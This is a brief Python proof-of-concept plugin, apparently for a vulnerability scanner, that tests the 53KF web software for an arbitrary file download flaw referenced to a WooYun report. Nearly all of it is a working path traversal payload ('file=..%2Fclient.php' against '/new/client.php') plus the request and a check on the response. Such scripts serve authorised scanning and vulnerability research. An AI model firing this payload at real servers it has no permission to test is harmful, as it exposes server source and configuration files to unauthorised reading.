#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:ko0zhi
"""
POC Name  :	 53KF任意文件下载    POC
Reference  :  http://www.wooyun.org/bugs/wooyun-2014-086882
"""

import re

def assign(service,arg):
    if service == "53kf":
        return True,arg
    pass

def audit(arg):
    url = arg
    payload = 'm=download&a=downloadFile&file=..%2Fclient.php'
    verify_url = url + '/new/client.php?%s' % payload
    code,head,res,errcode, finalurl = curl.curl(verify_url)
    if 'FRAMEWORK_PATH' in res:
        security_hole(verify_url)
    pass

if __name__ == "__main__":
    from dummy import *
    audit(assign('53kf', 'http://www.example.com/')[1])